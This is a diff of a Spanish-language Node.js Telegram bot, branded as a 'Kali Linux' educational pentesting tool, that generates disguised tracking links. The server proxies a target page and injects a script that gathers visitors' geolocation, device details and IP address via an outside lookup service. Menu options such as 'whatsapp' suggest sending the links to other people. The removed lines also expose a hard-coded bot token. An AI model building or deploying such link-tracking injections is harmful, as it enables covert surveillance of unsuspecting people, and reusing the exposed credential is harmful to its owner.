@@ -6,25 +6,34 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ⚠️ PON AQUÍ EL TOKEN DE TU BOT (el que creaste con @BotFather)
-const BOT_TOKEN = '8803149571:AAHDOGrQ-Y0TSoZBP4mSLzQlHTOFAbgR0Ug';
+// ========== TOKEN DESDE VARIABLES DE ENTORNO ==========
+const BOT_TOKEN = process.env.BOT_TOKEN;
+if (!BOT_TOKEN) {
+    console.error('❌ ERROR: Falta BOT_TOKEN en las variables de entorno');
+    console.error('👉 Configúralo en Render: Dashboard > Web Service > Environment Variables');
+    process.exit(1);
+}
+
+console.log('✅ Token cargado correctamente');
 
 const bot = new Telegraf(BOT_TOKEN);
 
 // ========== BASE DE DATOS EN MEMORIA ==========
-// Guarda la relación entre el token y la URL original
 const tokens = {};
 
 function generateToken() {
-    return crypto.randomBytes(6).toString('hex'); // Ej: a1b2c3d4e5f6
+    return crypto.randomBytes(6).toString('hex');
 }
 
 function createTrackLink(originalUrl) {
     const token = generateToken();
-    tokens[token] = { url: originalUrl, timestamp: Date.now() };
-    // El enlace que se comparte. Debe apuntar a la URL de tu servidor en Render.
-    // ⚠️ CAMBIA ESTO POR LA URL DE TU SERVIDOR CUANDO LO TENGAS EN RENDER
-    return `https://TU-DOMINIO-EN-RENDER.onrender.com/track/${token}`;
+    tokens[token] = { 
+        url: originalUrl, 
+        timestamp: Date.now() 
+    };
+    // ⚠️ IMPORTANTE: Reemplaza esta URL con la de tu servidor en Render
+    const baseUrl = process.env.BASE_URL || 'https://mi-bot-menu.onrender.com';
+    return `${baseUrl}/track/${token}`;
 }
 
 // ========== RUTA PARA REDIRIGIR CON SCRIPT INYECTADO ==========
@@ -33,45 +42,78 @@ app.get('/track/:token', async (req, res) => {
     const data = tokens[token];
     
     if (!data) {
-        return res.status(404).send('Enlace no válido o expirado');
+        return res.status(404).send(`
+            <h1>🔴 Enlace no válido</h1>
+            <p>El enlace que intentas abrir no existe o ha expirado.</p>
+            <p>Genera uno nuevo desde el bot de Telegram.</p>
+        `);
     }
     
     try {
-        // Obtener el contenido de la URL original
         const response = await fetch(data.url);
         let html = await response.text();
         
-        // ========== INYECTAR SCRIPT DE RASTREO EDUCATIVO ==========
         const trackingScript = `
         <script>
-        console.log('🔍 Rastreo educativo activado');
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    console.log('📍 Ubicación:', pos.coords.latitude, pos.coords.longitude);
-                },
-                () => console.log('📍 Usuario denegó ubicación')
-            );
-        }
-        console.log('📱 Dispositivo:', navigator.userAgent);
-        console.log('📐 Resolución:', window.screen.width, 'x', window.screen.height);
+            console.log('🔍 Rastreo educativo activado');
+            console.log('📱 Dispositivo:', navigator.userAgent);
+            console.log('📐 Resolución:', window.screen.width, 'x', window.screen.height);
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        console.log('📍 Ubicación:', pos.coords.latitude, pos.coords.longitude);
+                    },
+                    () => console.log('📍 Usuario denegó ubicación')
+                );
+            }
+            
+            // Capturar IP (a través de un servicio externo)
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    console.log('🌐 IP:', data.ip);
+                    console.log('🌍 País:', data.country_name);
+                })
+                .catch(() => console.log('🌐 IP: No disponible'));
         </script>
         `;
         
-        // Inyectar el script antes de cerrar el <body>
+        // Inyectar script antes de cerrar el <body>
         html = html.replace('</body>', trackingScript + '</body>');
-        
         res.send(html);
         
     } catch (error) {
-        res.status(500).send('Error al cargar la página solicitada');
+        console.error('Error al cargar la URL:', error);
+        res.status(500).send('❌ Error al cargar la página solicitada.');
     }
+});
+
+// ========== RUTA PRINCIPAL ==========
+app.get('/', (req, res) => {
+    res.send(`
+        <h1>🔐 Kali Bot</h1>
+        <p>Bot activo y funcionando.</p>
+        <p>Usa /start en Telegram para comenzar.</p>
+    `);
 });
 
 // ========== COMANDOS DEL BOT ==========
 bot.start(async (ctx) => {
-    await ctx.reply('🔐 *KALI LINUX BOT*\n━━━━━━━━━━━━━━━━\n$ root@system: Access Granted ~\n\nBienvenido al avanzado y potente Kali Linux Bot diseñado para pruebas de penetración y fines educativos\n\n2da Versión : @jsemanper\nPara video /tutorial\nMás Bots /bots\n\nSelecciona una opción a continuación para comenzar');
+    const msg = `🔐 *SECURITY BOT*
+━━━━━━━━━━━━━━━━
+
+$ SOCIETY$SISTEM: Access Granted ~
+
+Bienvenido al avanzado y potente Kali Linux Bot diseñado para pruebas de penetración y fines educativos
+
+*2da Versión* : @jsemanper
+Para video /tutorial
+Más Bots /bots
+
+Selecciona una opción a continuación para comenzar`;
+    
+    await ctx.reply(msg, { parse_mode: 'Markdown' });
 });
 
 bot.command('menu', async (ctx) => {
@@ -84,21 +126,31 @@ bot.command('menu', async (ctx) => {
             [{ text: '❓ Mi Información', callback_data: 'info' }]
         ]
     };
-    await ctx.reply('🎯 Selecciona una opción:', { reply_markup: keyboard });
+    await ctx.reply('🎯 *Selecciona una opción:*', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard 
+    });
 });
 
 // ========== MANEJADORES DE BOTONES ==========
-function handleGenerateLink(ctx) {
-    ctx.answerCbQuery();
-    ctx.reply('📎 Envía la URL del sitio que quieres monitorear (ej. https://ejemplo.com)');
-    // Esperar la URL en el próximo mensaje del usuario
+async function handleGenerateLink(ctx) {
+    await ctx.answerCbQuery();
+    await ctx.reply('📎 *Envía la URL del sitio que quieres monitorear*\nEjemplo: https://ejemplo.com', {
+        parse_mode: 'Markdown'
+    });
+    
+    // Capturar la URL en el próximo mensaje
     bot.on('text', async (ctx) => {
-        const url = ctx.message.text;
+        const url = ctx.message.text.trim();
         if (url.startsWith('http://') || url.startsWith('https://')) {
             const trackLink = createTrackLink(url);
-            await ctx.reply(`✅ Enlace generado:\n${trackLink}`);
+            await ctx.reply(`✅ *Enlace generado:*\n${trackLink}`, {
+                parse_mode: 'Markdown'
+            });
         } else {
-            await ctx.reply('❌ URL inválida. Debe comenzar con http:// o https://');
+            await ctx.reply('❌ *URL inválida.* Debe comenzar con http:// o https://', {
+                parse_mode: 'Markdown'
+            });
         }
     });
 }
@@ -110,14 +162,35 @@ bot.action('whatsapp', handleGenerateLink);
 
 bot.action('info', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.reply('ℹ️ Bot educativo. No compartas enlaces sin consentimiento.');
+    await ctx.reply(`
+ℹ️ *Bot Educativo*
+
+Este bot está diseñado para fines educativos.
+No compartas enlaces sin el consentimiento explícito de las personas.
+
+*Desarrollado por:* @jsemanper
+*Versión:* 2.0
+    `, { parse_mode: 'Markdown' });
 });
 
-// ========== SERVIDOR EXPRESS ==========
-app.get('/', (req, res) => res.send('Bot activo'));
-
+// ========== INICIO DEL SERVIDOR ==========
 app.listen(PORT, () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
+    console.log(`🤖 Bot iniciado con token: ${BOT_TOKEN.substring(0, 10)}...`);
 });
 
-bot.launch();
+bot.launch().then(() => {
+    console.log('✅ Bot conectado a Telegram');
+}).catch(err => {
+    console.error('❌ Error al conectar el bot:', err);
+});
+
+// ========== MANEJO DE SEÑALES ==========
+process.once('SIGINT', () => {
+    bot.stop('SIGINT');
+    console.log('🛑 Bot detenido por SIGINT');
+});
+process.once('SIGTERM', () => {
+    bot.stop('SIGTERM');
+    console.log('🛑 Bot detenido por SIGTERM');
+});
